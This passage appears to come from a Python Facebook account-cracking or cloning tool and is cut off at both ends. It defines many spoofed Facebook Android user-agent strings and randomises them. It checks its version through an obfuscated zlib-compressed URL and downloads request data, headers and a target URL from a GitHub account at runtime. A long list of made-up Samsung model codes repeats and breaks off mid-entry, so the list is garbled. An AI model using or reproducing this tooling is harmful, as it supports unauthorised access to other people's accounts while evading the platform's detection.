    uaz6 = "[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629374;FBDM/{density=4.0,width=1440,height=2768};FBLC/en_US;FBRV/210796532;FBCR/Republic;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960U1;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
    uaz7 = "[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681957;FBDM/{density=3.5,width=1440,height=2759};FBLC/en_US;FBRV/212345419;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N976V;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    uaz8 = "[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681925;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBRV/212646349;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1710-02;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    uaz9 = "[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027763;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/209644275;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    uaz10 = "[FBAN/FB4A;FBAV/377.0.0.22.107;FBBV/385537828;FBDM/{density=2.0,width=720,height=1384};FBLC/ru_RU;FBRV/386809220;FBCR/LMT;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J600FN;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    uaz11 = "[FBAN/FB4A;FBAV/264.0.0.44.111;FBBV/206636710;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/0;FBCR/Idea - Be Safe;FBMF/GIONEE;FBBD/GIONEE;FBPN/com.facebook.katana;FBDV/GIONEE F205 Pro;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    uaz12 = "[FBAN/FB4A;FBAV/272.0.0.50.125;FBBV/216845465;FBDM/{density=2.0,width=1536,height=2048};FBLC/en_US;FBRV/218114099;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T713;FBSV/7.0;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    uaz13 = "[FBAN/FB4A;FBAV/274.0.0.46.119;FBBV/219237439;FBDM/{density=1.7,width=720,height=1469};FBLC/hi_IN;FBRV/0;FBCR/Jio 4G;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX1911;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    uaz14 = "[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129387;FBDM/{density=2.75,width=1080,height=2030};FBLC/uk_UA;FBRV/227809097;FBCR/Vodafone UA;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    uaz15 = "[FBAN/FB4A;FBAV/269.0.0.50.127;FBBV/212783074;FBDM/{density=2.625,width=1080,height=2047};FBLC/en_US;FBRV/214205475;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    uaz16 = "[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231020946;FBDM/{density=1.5,width=480,height=782};FBLC/en_GB;FBRV/0;FBCR/VodaCom-SA;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/VFD 510;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    uaz17 = "[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021049;FBDM/{density=3.375,width=1080,height=2032};FBLC/it_IT;FBRV/232416429;FBCR/1 MOBILE;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/FIG-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    uaz18 = "[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231020883;FBDM/{density=3.0,width=1080,height=1792};FBLC/en_US;FBRV/233720555;FBCR/Telekom.de;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VTR-L09;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    uaz19 = "[FBAN/FB4A;FBAV/377.0.0.22.107;FBBV/385537805;FBDM/{density=2.75,width=1080,height=2131};FBLC/uk_UA;FBRV/387081651;FBCR/Vodafone UA;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    uaz20 = "[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897985;FBDM/{density=3.375,width=1080,height=1920};FBLC/ru_RU;FBRV/374252804;FBCR/A1 BY;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    agent = random.choice([uaz,uaz1,uaz2,uaz3,uaz4,uaz5,uaz6,uaz7,uaz8,uaz9,uaz10,uaz11,uaz12,uaz13,uaz14,uaz15,uaz16,uaz17,uaz18,uaz19,uaz20])
    xyx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + agent
    return xyx
#--------------------------------[VERSION CHANGE]--------
try:
    version = requests.get(zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\xd3\x0fK-*\xce\xcc\xcf\x03\t\x00\x00\xab\xe0\x1a\x00')).text
except:
    print('No Internet Connection.....');exit()
version = version.strip()
#-------------------------[RANDOM]--------
#-------------------------[METHOD 1 ]--------
try:
    DATAM1 = requests.get('https://raw.githubusercontent.com/Sumon8389/METHOD1/main/DATA.txt').text
except:
    print('No Internet Connection.....');exit()
DATAM1 = DATAM1.strip()
try:
    HEADERSM1 = requests.get('https://raw.githubusercontent.com/Sumon8389/METHOD1/main/HEADERS.txt').text
except:
    print('No Internet Connection.....');exit()
HEADERSM1 = HEADERSM1.strip()
try:
    URLM1 = requests.get('https://raw.githubusercontent.com/Sumon8389/METHOD1/main/URL.txt').text
except:
    print('No Internet Connection.....');exit()
URLM1 = URLM1.strip()
#----------------------------[USER/AGENT]-----------------------------------#
def ua():
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    zA=random.choice(['a','b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'])
    rx=random.randrange(1, 999)
    xx=f"Mozilla/5.0 (Wi    ndows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
    return xx

samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
samsung = ['GTH896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T;X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B